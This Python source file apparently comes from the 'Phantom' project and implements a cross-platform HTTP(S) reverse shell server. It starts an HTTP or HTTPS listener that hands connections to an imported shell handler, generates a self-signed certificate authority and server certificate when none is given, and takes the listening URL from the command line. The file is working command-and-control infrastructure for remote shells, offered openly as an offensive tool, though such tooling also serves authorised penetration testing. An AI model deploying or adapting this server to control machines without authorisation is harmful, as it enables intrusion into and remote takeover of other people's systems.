#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Phantom

__author__ = "EONRaider @ keybase.io/eonraider"

import ssl
import sys
from http.server import HTTPServer
from pathlib import Path

from src.phantom import Phantom
from src.server.handler import ShellHandler

from trustme import CA


class ShellServer(Phantom):
    def __init__(self, *,
                 server_url: str,
                 server_cert: [str, Path] = None):
        """Create a Reverse Shell Server that communicates with clients
        through HTTP(S).

        :param server_url: Full URL for the server (with optional port
            number) in the format 'SCHEME://DOMAIN|ADDRESS[:PORT]'.
            Ex: http://192.168.0.10:8080 or https://your-domain.com
        :param server_cert: Path to a file containing the server
            certificate in PEM format.
        """
        super().__init__(server_url)
        self.server_cert = server_cert

    @property
    def _base_path(self) -> Path:
        """Gets the absolute path for the directory from which this file
        is being executed."""
        try:
            '''If the file is compiled as a binary by PyInstaller, its 
            path will be set as sys._MEIPASS'''
            return Path(sys._MEIPASS)
        except AttributeError:
            return Path(__file__).parent.absolute()

    @property
    def server_cert(self) -> Path:
        """Gets a valid path to the server certificate file.
        Sets the path to the server certificate or creates a new CA that
        signs and writes it to a file.
        """
        return self._server_cert

    @server_cert.setter
    def server_cert(self, path: [str, Path]) -> None:
        server_cert = self._base_path.joinpath("server.pem") if \
            path is None else Path(path)
        if not server_cert.exists() and self._scheme == "https":
            '''A default server certificate for 'localhost' is created 
            if a certificate file is not supplied and the scheme is 
            HTTPS'''
            (ca := CA()).cert_pem.write_to_path("ca.pem")
            signed_cert = ca.issue_cert(self._host)
            signed_cert.private_key_and_cert_chain_pem.write_to_path(
                str(server_cert))
        self._server_cert = server_cert

    def execute(self) -> None:
        with HTTPServer((self._host, self._port), ShellHandler) as httpd:
            try:
                if self._scheme == "https":
                    httpd.socket = ssl.wrap_socket(
                        sock=httpd.socket,
                        server_side=True,
                        certfile=str(self.server_cert),
                        ssl_version=ssl.PROTOCOL_TLS
                    )
                print(f"[>] Server started on {self.server_url}")
                print("[>] Waiting for connections (press Ctrl+C to abort)...")
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Shutting down the server...")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Phantom - A cross-platform HTTP(S) Reverse Shell Server"
    )
    parser.add_argument(
        "url",
        type=str,
        help="Full URL for the server (with optional port number) in the "
             "format 'SCHEME://DOMAIN|ADDRESS[:PORT]'. "
             "Ex: http://192.168.0.10:8080 or https://your-domain.com"
    )
    parser.add_argument(
        "--server-cert",
        type=str,
        metavar="<path>",
        help="Path to a file containing the server certificate in PEM format. "
             "Creates a development certificate for 'localhost' if unset."
    )

    _args = parser.parse_args()

    ShellServer(server_url=_args.url, server_cert=_args.server_cert,).execute()
